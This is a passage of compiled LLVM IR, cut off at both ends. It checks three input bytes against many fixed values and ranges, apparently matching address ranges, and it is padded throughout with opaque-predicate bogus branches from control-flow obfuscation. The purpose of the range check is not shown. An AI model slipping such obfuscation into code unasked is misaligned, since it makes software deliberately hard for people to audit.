  %2565 = icmp eq i32 %2564, 0
  %2566 = icmp slt i32 %2561, 10
  %2567 = or i1 %2565, %2566
  br i1 %2567, label %originalBB338, label %originalBB338alteredBB

originalBB338:                                    ; preds = %originalBB338alteredBB, %2559
  %2568 = load i8, i8* %2, align 1
  %2569 = zext i8 %2568 to i32
  %2570 = icmp eq i32 %2569, 67
  %2571 = load i32, i32* @x.57
  %2572 = load i32, i32* @y.58
  %2573 = sub i32 %2571, 1
  %2574 = mul i32 %2571, %2573
  %2575 = urem i32 %2574, 2
  %2576 = icmp eq i32 %2575, 0
  %2577 = icmp slt i32 %2572, 10
  %2578 = or i1 %2576, %2577
  br i1 %2578, label %originalBBpart2340, label %originalBB338alteredBB

originalBBpart2340:                               ; preds = %originalBB338
  br i1 %2570, label %2579, label %2591

; <label>:2579:                                   ; preds = %originalBBpart2340
  %2580 = load i8, i8* %3, align 1
  %2581 = zext i8 %2580 to i32
  %2582 = icmp eq i32 %2581, 205
  br i1 %2582, label %2583, label %2591

; <label>:2583:                                   ; preds = %2579
  %2584 = load i8, i8* %4, align 1
  %2585 = zext i8 %2584 to i32
  %2586 = icmp sge i32 %2585, 128
  br i1 %2586, label %2587, label %2591

; <label>:2587:                                   ; preds = %2583
  %2588 = load i8, i8* %4, align 1
  %2589 = zext i8 %2588 to i32
  %2590 = icmp slt i32 %2589, 191
  br i1 %2590, label %5259, label %2591

; <label>:2591:                                   ; preds = %2587, %2583, %2579, %originalBBpart2340
  %2592 = load i8, i8* %2, align 1
  %2593 = zext i8 %2592 to i32
  %2594 = icmp eq i32 %2593, 80
  br i1 %2594, label %2595, label %2623

; <label>:2595:                                   ; preds = %2591
  %2596 = load i8, i8* %3, align 1
  %2597 = zext i8 %2596 to i32
  %2598 = icmp eq i32 %2597, 240
  br i1 %2598, label %2599, label %2623

; <label>:2599:                                   ; preds = %2595
  %2600 = load i8, i8* %4, align 1
  %2601 = zext i8 %2600 to i32
  %2602 = icmp sge i32 %2601, 128
  br i1 %2602, label %2603, label %2623

; <label>:2603:                                   ; preds = %2599
  %2604 = load i32, i32* @x.57
  %2605 = load i32, i32* @y.58
  %2606 = sub i32 %2604, 1
  %2607 = mul i32 %2604, %2606
  %2608 = urem i32 %2607, 2
  %2609 = icmp eq i32 %2608, 0
  %2610 = icmp slt i32 %2605, 10
  %2611 = or i1 %2609, %2610
  br i1 %2611, label %originalBB342, label %originalBB342alteredBB

originalBB342:                                    ; preds = %originalBB342alteredBB, %2603
  %2612 = load i8, i8* %4, align 1
  %2613 = zext i8 %2612 to i32
  %2614 = icmp slt i32 %2613, 143
  %2615 = load i32, i32* @x.57
  %2616 = load i32, i32* @y.58
  %2617 = sub i32 %2615, 1
  %2618 = mul i32 %2615, %2617
  %2619 = urem i32 %2618, 2
  %2620 = icmp eq i32 %2619, 0
  %2621 = icmp slt i32 %2616, 10
  %2622 = or i1 %2620, %2621
  br i1 %2622, label %originalBBpart2344, label %originalBB342alteredBB

originalBBpart2344:                               ; preds = %originalBB342
  br i1 %2614, label %5259, label %2623

; <label>:2623:                                   ; preds = %originalBBpart2344, %2599, %2595, %2591
  %2624 = load i8, i8* %2, align 1
  %2625 = zext i8 %2624 to i32
  %2626 = icmp eq i32 %2625, 82
  br i1 %2626, label %2627, label %2639

; <label>:2627:                                   ; preds = %2623
  %2628 = load i8, i8* %3, align 1
  %2629 = zext i8 %2628 to i32
  %2630 = icmp eq i32 %2629, 196
  br i1 %2630, label %2631, label %2639

; <label>:2631:                                   ; preds = %2627
  %2632 = load i8, i8* %4, align 1
  %2633 = zext i8 %2632 to i32
  %2634 = icmp sge i32 %2633, 1
  br i1 %2634, label %2635, label %2639

; <label>:2635:                                   ; preds = %2631
  %2636 = load i8, i8* %4, align 1
  %2637 = zext i8 %2636 to i32
  %2638 = icmp slt i32 %2637, 15
  br i1 %2638, label %5259, label %2639

; <label>:2639:                                   ; preds = %2635, %2631, %2627, %2623
  %2640 = load i8, i8* %2, align 1
  %2641 = zext i8 %2640 to i32
  %2642 = icmp eq i32 %2641, 95
  br i1 %2642, label %2643, label %2655

; <label>:2643:                                   ; preds = %2639
  %2644 = load i8, i8* %3, align 1
  %2645 = zext i8 %2644 to i32
  %2646 = icmp eq i32 %2645, 85
  br i1 %2646, label %2647, label %2655

; <label>:2647:                                   ; preds = %2643
  %2648 = load i8, i8* %4, align 1
  %2649 = zext i8 %2648 to i32
  %2650 = icmp sge i32 %2649, 8
  br i1 %2650, label %2651, label %2655

; <label>:2651:                                   ; preds = %2647
  %2652 = load i8, i8* %4, align 1
  %2653 = zext i8 %2652 to i32
  %2654 = icmp slt i32 %2653, 63
  br i1 %2654, label %5259, label %2655

; <label>:2655:                                   ; preds = %2651, %2647, %2643, %2639
  %2656 = load i32, i32* @x.57
  %2657 = load i32, i32* @y.58
  %2658 = sub i32 %2656, 1
  %2659 = mul i32 %2656, %2658
  %2660 = urem i32 %2659, 2
  %2661 = icmp eq i32 %2660, 0
  %2662 = icmp slt i32 %2657, 10
  %2663 = or i1 %2661, %2662
  br i1 %2663, label %originalBB346, label %originalBB346alteredBB

originalBB346:                                    ; preds = %originalBB346alteredBB, %2655
  %2664 = load i8, i8* %2, align 1
  %2665 = zext i8 %2664 to i32
  %2666 = icmp eq i32 %2665, 64
  %2667 = load i32, i32* @x.57
  %2668 = load i32, i32* @y.58
  %2669 = sub i32 %2667, 1
  %2670 = mul i32 %2667, %2669
  %2671 = urem i32 %2670, 2
  %2672 = icmp eq i32 %2671, 0
  %2673 = icmp slt i32 %2668, 10
  %2674 = or i1 %2672, %2673
  br i1 %2674, label %originalBBpart2348, label %originalBB346alteredBB

originalBBpart2348:                               ; preds = %originalBB346
  br i1 %2666, label %2675, label %2703

; <label>:2675:                                   ; preds = %originalBBpart2348
  %2676 = load i8, i8* %3, align 1
  %2677 = zext i8 %2676 to i32
  %2678 = icmp eq i32 %2677, 237
  br i1 %2678, label %2679, label %2703

; <label>:2679:                                   ; preds = %2675
  %2680 = load i32, i32* @x.57
  %2681 = load i32, i32* @y.58
  %2682 = sub i32 %2680, 1
  %2683 = mul i32 %2680, %2682
  %2684 = urem i32 %2683, 2
  %2685 = icmp eq i32 %2684, 0
  %2686 = icmp slt i32 %2681, 10
  %2687 = or i1 %2685, %2686
  br i1 %2687, label %originalBB350, label %originalBB350alteredBB

originalBB350:                                    ; preds = %originalBB350alteredBB, %2679
  %2688 = load i8, i8* %4, align 1
  %2689 = zext i8 %2688 to i32
  %2690 = icmp sge i32 %2689, 32
  %2691 = load i32, i32* @x.57
  %2692 = load i32, i32* @y.58
  %2693 = sub i32 %2691, 1
  %2694 = mul i32 %2691, %2693
  %2695 = urem i32 %2694, 2
  %2696 = icmp eq i32 %2695, 0
  %2697 = icmp slt i32 %2692, 10
  %2698 = or i1 %2696, %2697
  br i1 %2698, label %originalBBpart2352, label %originalBB350alteredBB

originalBBpart2352:                               ; preds = %originalBB350
  br i1 %2690, label %2699, label %2703

; <label>:2699:                                   ; preds = %originalBBpart2352
  %2700 = load i8, i8* %4, align 1
  %2701 = zext i8 %2700 to i32
  %2702 = icmp slt i32 %2701, 43
  br i1 %2702, label %5259, label %2703

; <label>:2703:                                   ; preds = %2699, %originalBBpart2352, %2675, %originalBBpart2348
  %2704 = load i32, i32* @x.57
  %2705 = load i32, i32* @y.58
  %2706 = sub i32 %2704, 1
  %2707 = mul i32 %2704, %2706
  %2708 = urem i32 %2707, 2
  %2709 = icmp eq i32 %2708, 0
  %2710 = icmp slt i32 %2705, 10
  %2711 = or i1 %2709, %2710
  br i1 %2711, label %originalBB354, label %originalBB354alteredBB

originalBB354:                                    ; preds = %originalBB354alteredBB, %2703
  %2712 = load i8, i8* %2, align 1
  %2713 = zext i8 %2712 to i32
  %2714 = icmp eq i32 %2713, 185
  %2715 = load i32, i32* @x.57
  %2716 = load i32, i32* @y.58
  %2717 = sub i32 %2715, 1
  %2718 = mul i32 %2715, %2717
  %2719 = urem i32 %2718, 2
  %2720 = icmp eq i32 %2719, 0
  %2721 = icmp slt i32 %2716, 10
  %2722 = or i1 %2720, %2721
  br i1 %2722, label %originalBBpart2356, label %originalBB354alteredBB

originalBBpart2356:                               ; preds = %originalBB354
  br i1 %2714, label %2723, label %2735

; <label>:2723:                                   ; preds = %originalBBpart2356
  %2724 = load i8, i8* %3, align 1
  %2725 = zext i8 %2724 to i32
  %2726 = icmp eq i32 %2725, 92
  br i1 %2726, label %2727, label %2735

; <label>:2727:                                   ; preds = %2723
  %2728 = load i8, i8* %4, align 1
  %2729 = zext i8 %2728 to i32
  %2730 = icmp sge i32 %2729, 220
  br i1 %2730, label %2731, label %2735

; <label>:2731:                                   ; preds = %2727
  %2732 = load i8, i8* %4, align 1
  %2733 = zext i8 %2732 to i32
  %2734 = icmp slt i32 %2733, 223
  br i1 %2734, label %5259, label %2735

; <label>:2735:                                   ; preds = %2731, %2727, %2723, %originalBBpart2356
  %2736 = load i32, i32* @x.57
  %2737 = load i32, i32* @y.58
  %2738 = sub i32 %2736, 1
  %2739 = mul i32 %2736, %2738
  %2740 = urem i32 %2739, 2
  %2741 = icmp eq i32 %2740, 0
  %2742 = icmp slt i32 %2737, 10
  %2743 = or i1 %2741, %2742
  br i1 %2743, label %originalBB358, label %originalBB358alteredBB

originalBB358:                                    ; preds = %originalBB358alteredBB, %2735
  %2744 = load i8, i8* %2, align 1
  %2745 = zext i8 %2744 to i32
  %2746 = icmp eq i32 %2745, 104
  %2747 = load i32, i32* @x.57
  %2748 = load i32, i32* @y.58
  %2749 = sub i32 %2747, 1
  %2750 = mul i32 %2747, %2749
  %2751 = urem i32 %2750, 2
  %2752 = icmp eq i32 %2751, 0
  %2753 = icmp slt i32 %2748, 10
  %2754 = or i1 %2752, %2753
  br i1 %2754, label %originalBBpart2360, label %originalBB358alteredBB

originalBBpart2360:                               ; preds = %originalBB358
  br i1 %2746, label %2755, label %2799

; <label>:2755:                                   ; preds = %originalBBpart2360
  %2756 = load i8, i8* %3, align 1
  %2757 = zext i8 %2756 to i32
  %2758 = icmp eq i32 %2757, 238
  br i1 %2758, label %2759, label %2799

; <label>:2759:                                   ; preds = %2755
  %2760 = load i32, i32* @x.57
  %2761 = load i32, i32* @y.58
  %2762 = sub i32 %2760, 1
  %2763 = mul i32 %2760, %2762
  %2764 = urem i32 %2763, 2
  %2765 = icmp eq i32 %2764, 0
  %2766 = icmp slt i32 %2761, 10
  %2767 = or i1 %2765, %2766
  br i1 %2767, label %originalBB362, label %originalBB362alteredBB

originalBB362:                                    ; preds = %originalBB362alteredBB, %2759
  %2768 = load i8, i8* %4, align 1
  %2769 = zext i8 %2768 to i32
  %2770 = icmp sge i32 %2769, 128
  %2771 = load i32, i32* @x.57
  %2772 = load i32, i32* @y.58
  %2773 = sub i32 %2771, 1
  %2774 = mul i32 %2771, %2773
  %2775 = urem i32 %2774, 2
  %2776 = icmp eq i32 %2775, 0
  %2777 = icmp slt i32 %2772, 10
  %2778 = or i1 %2776, %2777
  br i1 %2778, label %originalBBpart2364, label %originalBB362alteredBB

originalBBpart2364:                               ; preds = %originalBB362
  br i1 %2770, label %2779, label %2799

; <label>:2779:                                   ; preds = %originalBBpart2364
  %2780 = load i32, i32* @x.57
  %2781 = load i32, i32* @y.58
  %2782 = sub i32 %2780, 1
  %2783 = mul i32 %2780, %2782
  %2784 = urem i32 %2783, 2
  %2785 = icmp eq i32 %2784, 0
  %2786 = icmp slt i32 %2781, 10
  %2787 = or i1 %2785, %2786
  br i1 %2787, label %originalBB366, label %originalBB366alteredBB

originalBB366:                                    ; preds = %originalBB366alteredBB, %2779
  %2788 = load i8, i8* %4, align 1
  %2789 = zext i8 %2788 to i32
  %2790 = icmp slt i32 %2789, 191
  %2791 = load i32, i32* @x.57
  %2792 = load i32, i32* @y.58
  %2793 = sub i32 %2791, 1
  %2794 = mul i32 %2791, %2793
  %2795 = urem i32 %2794, 2
  %2796 = icmp eq i32 %2795, 0
  %2797 = icmp slt i32 %2792, 10
  %2798 = or i1 %2796, %2797
  br i1 %2798, label %originalBBpart2368, label %originalBB366alteredBB

originalBBpart2368:                               ; preds = %originalBB366
  br i1 %2790, label %5259, label %2799

; <label>:2799:                                   ; preds = %originalBBpart2368, %originalBBpart2364, %2755, %originalBBpart2360
  %2800 = load i8, i8* %2, align 1
  %2801 = zext i8 %2800 to i32
  %2802 = icmp eq i32 %2801, 209
  br i1 %2802, label %2803, label %2815

; <label>:2803:                                   ; preds = %2799
  %2804 = load i8, i8* %3, align 1
  %2805 = zext i8 %2804 to i32
  %2806 = icmp eq i32 %2805, 222
  br i1 %2806, label %2807, label %2815

; <label>:2807:                                   ; preds = %2803
  %2808 = load i8, i8* %4, align 1
  %2809 = zext i8 %2808 to i32
  %2810 = icmp sge i32 %2809, 1
  br i1 %2810, label %2811, label %2815

; <label>:2811:                                   ; preds = %2807
  %2812 = load i8, i8* %4, align 1
  %2813 = zext i8 %2812 to i32
  %2814 = icmp slt i32 %2813, 31
  br i1 %2814, label %5259, label %2815

; <label>:2815:                                   ; preds = %2811, %2807, %2803, %2799
  %2816 = load i32, i32* @x.57
  %2817 = load i32, i32* @y.58
  %2818 = sub i32 %2816, 1
  %2819 = mul i32 %2816, %2818
  %2820 = urem i32 %2819, 2
  %2821 = icmp eq i32 %2820, 0
  %2822 = icmp slt i32 %2817, 10
  %2823 = or i1 %2821, %2822
  br i1 %2823, label %originalBB370, label %originalBB370alteredBB

originalBB370:                                    ; preds = %originalBB370alteredBB, %2815
  %2824 = load i8, i8* %2, align 1
  %2825 = zext i8 %2824 to i32
  %2826 = icmp eq i32 %2825, 208
  %2827 = load i32, i32* @x.57
  %2828 = load i32, i32* @y.58
  %2829 = sub i32 %2827, 1
  %2830 = mul i32 %2827, %2829
  %2831 = urem i32 %2830, 2
  %2832 = icmp eq i32 %2831, 0
  %2833 = icmp slt i32 %2828, 10
  %2834 = or i1 %2832, %2833
  br i1 %2834, label %originalBBpart2372, label %originalBB370alteredBB

originalBBpart2372:                               ; preds = %originalBB370
  br i1 %2826, label %2835, label %2847

; <label>:2835:                                   ; preds = %originalBBpart2372
  %2836 = load i8, i8* %3, align 1
  %2837 = zext i8 %2836 to i32
  %2838 = icmp eq i32 %2837, 167
  br i1 %2838, label %2839, label %2847

; <label>:2839:                                   ; preds = %2835
  %2840 = load i8, i8* %4, align 1
  %2841 = zext i8 %2840 to i32
  %2842 = icmp sge i32 %2841, 232
  br i1 %2842, label %2843, label %2847

; <label>:2843:                                   ; preds = %2839
  %2844 = load i8, i8* %4, align 1
  %2845 = zext i8 %2844 to i32
  %2846 = icmp slt i32 %2845, 252
  br i1 %2846, label %5259, label %2847

; <label>:2847:                                   ; preds = %2843, %2839, %2835, %originalBBpart2372
  %2848 = load i8, i8* %2, align 1
  %2849 = zext i8 %2848 to i32
  %2850 = icmp eq i32 %2849, 66
  br i1 %2850, label %2851, label %2863

; <label>:2851:                                   ; preds = %2847
  %2852 = load i8, i8* %3, align 1
  %2853 = zext i8 %2852 to i32
  %2854 = icmp eq i32 %2853, 55
  br i1 %2854, label %2855, label %2863

; <label>:2855:                                   ; preds = %2851
  %2856 = load i8, i8* %4, align 1
  %2857 = zext i8 %2856 to i32
  %2858 = icmp sge i32 %2857, 128
  br i1 %2858, label %2859, label %2863

; <label>:2859:                                   ; preds = %2855
  %2860 = load i8, i8* %4, align 1
  %2861 = zext i8 %2860 to i32
  %2862 = icmp slt i32 %2861, 159
  br i1 %2862, label %5259, label %2863

; <label>:2863:                                   ; preds = %2859, %2855, %2851, %2847
  %2864 = load i32, i32* @x.57
  %2865 = load i32, i32* @y.58
  %2866 = sub i32 %2864, 1
  %2867 = mul i32 %2864, %2866
  %2868 = urem i32 %2867, 2
  %2869 = icmp eq i32 %2868, 0
  %2870 = icmp slt i32 %2865, 10
  %2871 = or i1 %2869, %2870
  br i1 %2871, label %originalBB374, label %originalBB374alteredBB

originalBB374:                                    ; preds = %originalBB374alteredBB, %2863
  %2872 = load i8, i8* %2, align 1
  %2873 = zext i8 %2872 to i32
  %2874 = icmp eq i32 %2873, 45
  %2875 = load i32, i32* @x.57
  %2876 = load i32, i32* @y.58
  %2877 = sub i32 %2875, 1
  %2878 = mul i32 %2875, %2877
  %2879 = urem i32 %2878, 2
  %2880 = icmp eq i32 %2879, 0
  %2881 = icmp slt i32 %2876, 10
  %2882 = or i1 %2880, %2881
  br i1 %2882, label %originalBBpart2376, label %originalBB374alteredBB

originalBBpart2376:                               ; preds = %originalBB374
  br i1 %2874, label %2883, label %2927

; <label>:2883:                                   ; preds = %originalBBpart2376
  %2884 = load i32, i32* @x.57
  %2885 = load i32, i32* @y.58
  %2886 = sub i32 %2884, 1
  %2887 = mul i32 %2884, %2886
  %2888 = urem i32 %2887, 2
  %2889 = icmp eq i32 %2888, 0
  %2890 = icmp slt i32 %2885, 10
  %2891 = or i1 %2889, %2890
  br i1 %2891, label %originalBB378, label %originalBB378alteredBB

originalBB378:                                    ; preds = %originalBB378alteredBB, %2883
  %2892 = load i8, i8* %3, align 1
  %2893 = zext i8 %2892 to i32
  %2894 = icmp eq i32 %2893, 63
  %2895 = load i32, i32* @x.57
  %2896 = load i32, i32* @y.58
  %2897 = sub i32 %2895, 1
  %2898 = mul i32 %2895, %2897
  %2899 = urem i32 %2898, 2
  %2900 = icmp eq i32 %2899, 0
  %2901 = icmp slt i32 %2896, 10
  %2902 = or i1 %2900, %2901
  br i1 %2902, label %originalBBpart2380, label %originalBB378alteredBB

originalBBpart2380:                               ; preds = %originalBB378
  br i1 %2894, label %2903, label %2927

; <label>:2903:                                   ; preds = %originalBBpart2380
  %2904 = load i32, i32* @x.57
  %2905 = load i32, i32* @y.58
  %2906 = sub i32 %2904, 1
  %2907 = mul i32 %2904, %2906
  %2908 = urem i32 %2907, 2
  %2909 = icmp eq i32 %2908, 0
  %2910 = icmp slt i32 %2905, 10
  %2911 = or i1 %2909, %2910
  br i1 %2911, label %originalBB382, label %originalBB382alteredBB

originalBB382:                                    ; preds = %originalBB382alteredBB, %2903
  %2912 = load i8, i8* %4, align 1
  %2913 = zext i8 %2912 to i32
  %2914 = icmp sge i32 %2913, 1
  %2915 = load i32, i32* @x.57
  %2916 = load i32, i32* @y.58
  %2917 = sub i32 %2915, 1
  %2918 = mul i32 %2915, %2917
  %2919 = urem i32 %2918, 2
  %2920 = icmp eq i32 %2919, 0
  %2921 = icmp slt i32 %2916, 10
  %2922 = or i1 %2920, %2921
  br i1 %2922, label %originalBBpart2384, label %originalBB382alteredBB

originalBBpart2384:                               ; preds = %originalBB382
  br i1 %2914, label %2923, label %2927

; <label>:2923:                                   ; preds = %originalBBpart2384
  %2924 = load i8, i8* %4, align 1
  %2925 = zext i8 %2924 to i32
  %2926 = icmp slt i32 %2925, 127
  br i1 %2926, label %5259, label %2927

; <label>:2927:                                   ; preds = %2923, %originalBBpart2384, %originalBBpart2380, %originalBBpart2376
  %2928 = load i32, i32* @x.57
  %2929 = load i32, i32* @y.58
  %2930 = sub i32 %2928, 1
  %2931 = mul i32 %2928, %2930
  %2932 = urem i32 %2931, 2
  %2933 = icmp eq i32 %2932, 0
  %2934 = icmp slt i32 %2929, 10
  %2935 = or i1 %2933, %2934
  br i1 %2935, label %originalBB386, label %originalBB386alteredBB

originalBB386:                                    ; preds = %originalBB386alteredBB, %2927
  %2936 = load i8, i8* %2, align 1
  %2937 = zext i8 %2936 to i32
  %2938 = icmp eq i32 %2937, 216
  %2939 = load i32, i32* @x.57
  %2940 = load i32, i32* @y.58
  %2941 = sub i32 %2939, 1
  %2942 = mul i32 %2939, %2941
  %2943 = urem i32 %2942, 2
  %2944 = icmp eq i32 %2943, 0
  %2945 = icmp slt i32 %2940, 10
  %2946 = or i1 %2944, %2945
  br i1 %2946, label %originalBBpart2388, label %originalBB386alteredBB

originalBBpart2388:                               ; preds = %originalBB386
  br i1 %2938, label %2947, label %2975

; <label>:2947:                                   ; preds = %originalBBpart2388
  %2948 = load i32, i32* @x.57
  %2949 = load i32, i32* @y.58
  %2950 = sub i32 %2948, 1
  %2951 = mul i32 %2948, %2950
  %2952 = urem i32 %2951, 2
  %2953 = icmp eq i32 %2952, 0
  %2954 = icmp slt i32 %2949, 10
  %2955 = or i1 %2953, %2954
  br i1 %2955, label %originalBB390, label %originalBB390alteredBB

originalBB390:                                    ; preds = %originalBB390alteredBB, %2947
  %2956 = load i8, i8* %3, align 1
  %2957 = zext i8 %2956 to i32
  %2958 = icmp eq i32 %2957, 237
  %2959 = load i32, i32* @x.57
  %2960 = load i32, i32* @y.58
  %2961 = sub i32 %2959, 1
  %2962 = mul i32 %2959, %2961
  %2963 = urem i32 %2962, 2
  %2964 = icmp eq i32 %2963, 0
  %2965 = icmp slt i32 %2960, 10
  %2966 = or i1 %2964, %2965
  br i1 %2966, label %originalBBpart2392, label %originalBB390alteredBB

originalBBpart2392:                               ; preds = %originalBB390
  br i1 %2958, label %2967, label %2975

; <label>:2967:                                   ; preds = %originalBBpart2392
  %2968 = load i8, i8* %4, align 1
  %2969 = zext i8 %2968 to i32
  %2970 = icmp sge i32 %2969, 128
  br i1 %2970, label %2971, label %2975

; <label>:2971:                                   ; preds = %2967
  %2972 = load i8, i8* %4, align 1
  %2973 = zext i8 %2972 to i32
  %2974 = icmp slt i32 %2973, 159
  br i1 %2974, label %5259, label %2975

; <label>:2975:                                   ; preds = %2971, %2967, %originalBBpart2392, %originalBBpart2388
  %2976 = load i32, i32* @x.57
  %2977 = load i32, i32* @y.58
  %2978 = sub i32 %2976, 1
  %2979 = mul i32 %2976, %2978
  %2980 = urem i32 %2979, 2
  %2981 = icmp eq i32 %2980, 0
  %2982 = icmp slt i32 %2977, 10
  %2983 = or i1 %2981, %2982
  br i1 %2983, label %originalBB394, label %originalBB394alteredBB

originalBB394:                                    ; preds = %originalBB394alteredBB, %2975
  %2984 = load i8, i8* %2, align 1
  %2985 = zext i8 %2984 to i32
  %2986 = icmp eq i32 %2985, 108
  %2987 = load i32, i32* @x.57
  %2988 = load i32, i32* @y.58
  %2989 = sub i32 %2987, 1
  %2990 = mul i32 %2987, %2989
  %2991 = urem i32 %2990, 2
  %2992 = icmp eq i32 %2991, 0
  %2993 = icmp slt i32 %2988, 10
  %2994 = or i1 %2992, %2993
  br i1 %2994, label %originalBBpart2396, label %originalBB394alteredBB

originalBBpart2396:                               ; preds = %originalBB394
  br i1 %2986, label %2995, label %3015

; <label>:2995:                                   ; preds = %originalBBpart2396
  %2996 = load i32, i32* @x.57
  %2997 = load i32, i32* @y.58
  %2998 = sub i32 %2996, 1
  %2999 = mul i32 %2996, %2998
  %3000 = urem i32 %2999, 2
  %3001 = icmp eq i32 %3000, 0
  %3002 = icmp slt i32 %2997, 10
  %3003 = or i1 %3001, %3002
  br i1 %3003, label %originalBB398, label %originalBB398alteredBB

originalBB398:                                    ; preds = %originalBB398alteredBB, %2995
  %3004 = load i8, i8* %3, align 1
  %3005 = zext i8 %3004 to i32
  %3006 = icmp eq i32 %3005, 61
  %3007 = load i32, i32* @x.57
  %3008 = load i32, i32* @y.58
  %3009 = sub i32 %3007, 1
  %3010 = mul i32 %3007, %3009
  %3011 = urem i32 %3010, 2
  %3012 = icmp eq i32 %3011, 0
  %3013 = icmp slt i32 %3008, 10
  %3014 = or i1 %3012, %3013
  br i1 %3014, label %originalBBpart2400, label %originalBB398alteredBB

originalBBpart2400:                               ; preds = %originalBB398
  br i1 %3006, label %5259, label %3015

; <label>:3015:                                   ; preds = %originalBBpart2400, %originalBBpart2396
  %3016 = load i32, i32* @x.57
  %3017 = load i32, i32* @y.58
  %3018 = sub i32 %3016, 1
  %3019 = mul i32 %3016, %3018
  %3020 = urem i32 %3019, 2
  %3021 = icmp eq i32 %3020, 0
  %3022 = icmp slt i32 %3017, 10
  %3023 = or i1 %3021, %3022
  br i1 %3023, label %originalBB402, label %originalBB402alteredBB

originalBB402:                                    ; preds = %originalBB402alteredBB, %3015
  %3024 = load i8, i8* %2, align 1
  %3025 = zext i8 %3024 to i32
  %3026 = icmp eq i32 %3025, 45
  %3027 = load i32, i32* @x.57
  %3028 = load i32, i32* @y.58
  %3029 = sub i32 %3027, 1
  %3030 = mul i32 %3027, %3029
  %3031 = urem i32 %3030, 2
  %3032 = icmp eq i32 %3031, 0
  %3033 = icmp slt i32 %3028, 10
  %3034 = or i1 %3032, %3033
  br i1 %3034, label %originalBBpart2404, label %originalBB402alteredBB

originalBBpart2404:                               ; preds = %originalBB402
  br i1 %3026, label %3035, label %3055

; <label>:3035:                                   ; preds = %originalBBpart2404
  %3036 = load i32, i32* @x.57
  %3037 = load i32, i32* @y.58
  %3038 = sub i32 %3036, 1
  %3039 = mul i32 %3036, %3038
  %3040 = urem i32 %3039, 2
  %3041 = icmp eq i32 %3040, 0
  %3042 = icmp slt i32 %3037, 10
  %3043 = or i1 %3041, %3042
  br i1 %3043, label %originalBB406, label %originalBB406alteredBB

originalBB406:                                    ; preds = %originalBB406alteredBB, %3035
  %3044 = load i8, i8* %3, align 1
  %3045 = zext i8 %3044 to i32
  %3046 = icmp eq i32 %3045, 76
  %3047 = load i32, i32* @x.57
  %3048 = load i32, i32* @y.58
  %3049 = sub i32 %3047, 1
  %3050 = mul i32 %3047, %3049
  %3051 = urem i32 %3050, 2
  %3052 = icmp eq i32 %3051, 0
  %3053 = icmp slt i32 %3048, 10
  %3054 = or i1 %3052, %3053
  br i1 %3054, label %originalBBpart2408, label %originalBB406alteredBB

originalBBpart2408:                               ; preds = %originalBB406
  br i1 %3046, label %5259, label %3055

; <label>:3055:                                   ; preds = %originalBBpart2408, %originalBBpart2404
  %3056 = load i8, i8* %2, align 1
  %3057 = zext i8 %3056 to i32
  %3058 = icmp eq i32 %3057, 185
  br i1 %3058, label %3059, label %3087

; <label>:3059:                                   ; preds = %3055
  %3060 = load i8, i8* %3, align 1
  %3061 = zext i8 %3060 to i32
  %3062 = icmp eq i32 %3061, 11
  br i1 %3062, label %3063, label %3087

; <label>:3063:                                   ; preds = %3059
  %3064 = load i8, i8* %4, align 1
  %3065 = zext i8 %3064 to i32
  %3066 = icmp sge i32 %3065, 144
  br i1 %3066, label %3067, label %3087

; <label>:3067:                                   ; preds = %3063
  %3068 = load i32, i32* @x.57
  %3069 = load i32, i32* @y.58
  %3070 = sub i32 %3068, 1
  %3071 = mul i32 %3068, %3070
  %3072 = urem i32 %3071, 2
  %3073 = icmp eq i32 %3072, 0
  %3074 = icmp slt i32 %3069, 10
  %3075 = or i1 %3073, %3074
  br i1 %3075, label %originalBB410, label %originalBB410alteredBB

originalBB410:                                    ; preds = %originalBB410alteredBB, %3067
  %3076 = load i8, i8* %4, align 1
  %3077 = zext i8 %3076 to i32
  %3078 = icmp slt i32 %3077, 148
  %3079 = load i32, i32* @x.57
  %3080 = load i32, i32* @y.58
  %3081 = sub i32 %3079, 1
  %3082 = mul i32 %3079, %3081
  %3083 = urem i32 %3082, 2
  %3084 = icmp eq i32 %3083, 0
  %3085 = icmp slt i32 %3080, 10
  %3086 = or i1 %3084, %3085
  br i1 %3086, label %originalBBpart2412, label %originalBB410alteredBB

originalBBpart2412:                               ; preds = %originalBB410
  br i1 %3078, label %5259, label %3087

; <label>:3087:                                   ; preds = %originalBBpart2412, %3063, %3059, %3055
  %3088 = load i8, i8* %2, align 1
  %3089 = zext i8 %3088 to i32
  %3090 = icmp eq i32 %3089, 185
  br i1 %3090, label %3091, label %3103

; <label>:3091:                                   ; preds = %3087
  %3092 = load i8, i8* %3, align 1
  %3093 = zext i8 %3092 to i32
  %3094 = icmp eq i32 %3093, 56
  br i1 %3094, label %3095, label %3103

; <label>:3095:                                   ; preds = %3091
  %3096 = load i8, i8* %4, align 1
  %3097 = zext i8 %3096 to i32
  %3098 = icmp sge i32 %3097, 21
  br i1 %3098, label %3099, label %3103

; <label>:3099:                                   ; preds = %3095
  %3100 = load i8, i8* %4, align 1
  %3101 = zext i8 %3100 to i32
  %3102 = icmp slt i32 %3101, 23
  br i1 %3102, label %5259, label %3103

; <label>:3103:                                   ; preds = %3099, %3095, %3091, %3087
  %3104 = load i32, i32* @x.57
  %3105 = load i32, i32* @y.58
  %3106 = sub i32 %3104, 1
  %3107 = mul i32 %3104, %3106
  %3108 = urem i32 %3107, 2
  %3109 = icmp eq i32 %3108, 0
  %3110 = icmp slt i32 %3105, 10
  %3111 = or i1 %3109, %3110
  br i1 %3111, label %originalBB414, label %originalBB414alteredBB

originalBB414:                                    ; preds = %originalBB414alteredBB, %3103
  %3112 = load i8, i8* %2, align 1
  %3113 = zext i8 %3112 to i32
  %3114 = icmp eq i32 %3113, 185
  %3115 = load i32, i32* @x.57
  %3116 = load i32, i32* @y.58
  %3117 = sub i32 %3115, 1
  %3118 = mul i32 %3115, %3117
  %3119 = urem i32 %3118, 2
  %3120 = icmp eq i32 %3119, 0
  %3121 = icmp slt i32 %3116, 10
  %3122 = or i1 %3120, %3121
  br i1 %3122, label %originalBBpart2416, label %originalBB414alteredBB

originalBBpart2416:                               ; preds = %originalBB414
  br i1 %3114, label %3123, label %3167

; <label>:3123:                                   ; preds = %originalBBpart2416
  %3124 = load i8, i8* %3, align 1
  %3125 = zext i8 %3124 to i32
  %3126 = icmp eq i32 %3125, 61
  br i1 %3126, label %3127, label %3167

; <label>:3127:                                   ; preds = %3123
  %3128 = load i32, i32* @x.57
  %3129 = load i32, i32* @y.58
  %3130 = sub i32 %3128, 1
  %3131 = mul i32 %3128, %3130
  %3132 = urem i32 %3131, 2
  %3133 = icmp eq i32 %3132, 0
  %3134 = icmp slt i32 %3129, 10
  %3135 = or i1 %3133, %3134
  br i1 %3135, label %originalBB418, label %originalBB418alteredBB

originalBB418:                                    ; preds = %originalBB418alteredBB, %3127
